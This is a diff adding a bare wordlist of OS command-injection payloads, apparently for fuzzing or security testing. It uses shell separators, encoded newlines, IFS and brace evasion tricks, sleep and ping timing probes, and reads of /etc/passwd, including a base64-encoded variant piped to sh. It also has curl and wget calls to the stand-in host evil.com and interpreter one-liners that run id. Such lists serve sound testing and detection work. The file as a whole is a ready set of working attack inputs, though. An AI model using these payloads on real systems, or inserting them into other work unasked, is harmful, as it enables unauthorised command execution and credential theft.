@@ -1,0 +1,68 @@
+;id
+;id;
+|id
+|id|
+||id
+`id`
+$(id)
+;ls
+;ls -la
+|ls
+|ls -la
+;cat /etc/passwd
+|cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;whoami
+|whoami
+`whoami`
+$(whoami)
+;uname -a
+|uname -a
+`uname -a`
+$(uname -a)
+;ping -c 1 127.0.0.1
+|ping -c 1 127.0.0.1
+;curl http://evil.com
+|curl http://evil.com
+;wget http://evil.com
+&id
+&id&
+&&id
+&&id&&
+%0aid
+%0a id
+%0d%0aid
+%0a%0did
+;sleep 5
+|sleep 5
+`sleep 5`
+$(sleep 5)
+;sleep 5;
+|sleep 5|
+&sleep 5&
+&&sleep 5&&
+;ping -c 5 127.0.0.1;
+|| ping -c 5 127.0.0.1
+& ping -c 5 127.0.0.1 &
+; ping -c 5 127.0.0.1 ;
+{sleep,5}
+IFS=,;`cat<<\EOF,sleep,5,EOF`
+a]%0d%0a[id
+a]%0d%0a[sleep 5
+;{id}
+${IFS}id
+;$IFS'id'
+;${IFS}id
+;echo${IFS}test
+a]%0d%0asleep${IFS}5%0d%0a[
+;echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh
+;echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh
+$(echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d)
+`echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d`
+;python -c 'import os;os.system("id")'
+;python3 -c 'import os;os.system("id")'
+;perl -e 'system("id")'
+;ruby -e 'system("id")'
+;node -e 'require("child_process").execSync("id")'
+;php -r 'system("id");'
